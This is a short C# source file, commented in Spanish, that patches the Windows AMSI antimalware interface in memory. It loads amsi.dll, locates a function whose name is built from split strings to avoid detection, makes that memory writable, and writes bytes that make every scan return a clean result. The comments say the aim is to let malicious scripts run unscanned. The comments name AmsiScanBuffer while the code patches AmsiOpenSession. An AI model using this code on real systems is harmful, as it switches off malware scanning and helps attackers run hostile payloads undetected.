using System;
using System.Runtime.InteropServices;

public class Super
{
    //https://twitter.com/_xpn_/status/1170852932650262530
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //mov eax, 0x80070057 y ret para que apunte a AMSI_RESULT_CLEAN

    public static void Bypass()
    {
        Execute(x64);
    }
    private static void Execute(byte[] patch) //Funcion para cargar el parcheo de Amsi y que haga amsiscanbuffer=0 (ergo, nunca se escanea lo que se pase como script)
    {
        try
        {
            var library = Win32.LoadLibrary("amsi"); //Cargamos la dll de amsi en memoria y poder modificarla
            var getaddress = Win32.GetProcAddress(library, "Am" + "si" + "Op" + "en" + "Sess" + "ion"); //Cargamos la posicion en memoria de AmsiScanBuffer
            //La funcion amsicanbuffer es la encargada de analizar el buffer donde se mete el script (malware) a analizar

            uint oldProtect;
            Win32.VirtualProtect(getaddress, (UIntPtr)patch.Length, 0x40, out oldProtect); //VirtualProtect permite cambiar las protecciones de una region de las direcciones virtuales de un proceso.
            //En este caso, asignamos permisos de escritura a la direccion virtual de amsiscanbuffer para poder modificar su flujo y que siempre apunte a AMSI_RESULT_CLEAN 

            Marshal.Copy(patch, 0, getaddress, patch.Length); //Con mashal.copy pegamos los bytes que hacen que siempre apunte a AMSI_RESULT_CLEAN --> 0x18000245f, es decir, mov eax, 0x80070057 y ret
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32 //clases necesarias para que funcione este programa
{
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
